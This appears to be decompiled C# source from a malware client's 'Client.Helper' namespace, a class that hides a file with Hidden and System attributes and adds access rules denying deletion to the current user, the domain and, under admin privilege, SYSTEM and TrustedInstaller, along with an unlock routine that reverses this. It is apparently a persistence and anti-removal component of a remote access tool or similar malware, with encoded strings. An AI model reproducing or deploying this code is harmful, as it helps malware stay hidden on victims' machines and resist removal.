using System;
using System.IO;
using System.Security.AccessControl;
using System.Threading;

namespace Client.Helper
{
	// Token: 0x02000012 RID: 18
	internal class SecrityHidden
	{
		// Token: 0x06000069 RID: 105 RVA: 0x000058BC File Offset: 0x00003ABC
		public static void Unlock(string path)
		{
			try
			{
				FileInfo fileInfo = new FileInfo(path);
				try
				{
					foreach (string account in SecrityHidden.Naming)
					{
						SecrityHidden.RemoveFileSecurity(fileInfo.FullName, account, FileSystemRights.Delete, AccessControlType.Deny);
					}
					if (Config.Privilege == EncryptString.Decode("Admin"))
					{
						foreach (string account2 in SecrityHidden.NamingAdm)
						{
							SecrityHidden.RemoveFileSecurity(fileInfo.FullName, account2, FileSystemRights.Delete, AccessControlType.Deny);
						}
					}
				}
				catch
				{
				}
				fileInfo.Directory.Attributes = FileAttributes.Normal;
				fileInfo.Attributes = FileAttributes.Normal;
			}
			catch
			{
			}
		}

		// Token: 0x0600006A RID: 106 RVA: 0x0000599C File Offset: 0x00003B9C
		public static void HiddenFile(string path)
		{
			try
			{
				FileInfo fileInfo = new FileInfo(path);
				if (Config.Privilege == EncryptString.Decode("Admin"))
				{
					fileInfo.Attributes = (FileAttributes.Hidden | FileAttributes.System);
				}
				else
				{
					fileInfo.Attributes = FileAttributes.Hidden;
				}
				foreach (string account in SecrityHidden.Naming)
				{
					SecrityHidden.AddFileSecurity(path, account, FileSystemRights.Delete, AccessControlType.Deny);
					SecrityHidden.AddFileSecurity(path, account, FileSystemRights.ReadAndExecute, AccessControlType.Allow);
				}
				if (Config.Privilege == EncryptString.Decode("Admin"))
				{
					foreach (string account2 in SecrityHidden.NamingAdm)
					{
						SecrityHidden.AddFileSecurity(path, account2, FileSystemRights.Delete, AccessControlType.Deny);
						SecrityHidden.AddFileSecurity(path, account2, FileSystemRights.ReadAndExecute, AccessControlType.Allow);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600006B RID: 107 RVA: 0x00005A88 File Offset: 0x00003C88
		public static void RemoveFileSecurity(string fileName, string account, FileSystemRights rights, AccessControlType controlType)
		{
			try
			{
				FileSecurity accessControl = File.GetAccessControl(fileName);
				accessControl.RemoveAccessRule(new FileSystemAccessRule(account, rights, controlType));
				File.SetAccessControl(fileName, accessControl);
			}
			catch
			{
				Thread.Sleep(10);
			}
		}

		// Token: 0x0600006C RID: 108 RVA: 0x00005AD4 File Offset: 0x00003CD4
		public static void AddFileSecurity(string fileName, string account, FileSystemRights rights, AccessControlType controlType)
		{
			try
			{
				FileSecurity accessControl = File.GetAccessControl(fileName);
				accessControl.AddAccessRule(new FileSystemAccessRule(account, rights, controlType));
				File.SetAccessControl(fileName, accessControl);
			}
			catch
			{
				Thread.Sleep(10);
			}
		}

		// Token: 0x0400003B RID: 59
		public static string[] Naming = new string[]
		{
			Environment.UserName,
			Environment.UserDomainName
		};

		// Token: 0x0400003C RID: 60
		public static string[] NamingAdm = new string[]
		{
			EncryptString.Decode("System"),
			EncryptString.Decode("TrustedInsraller")
		};
	}
}
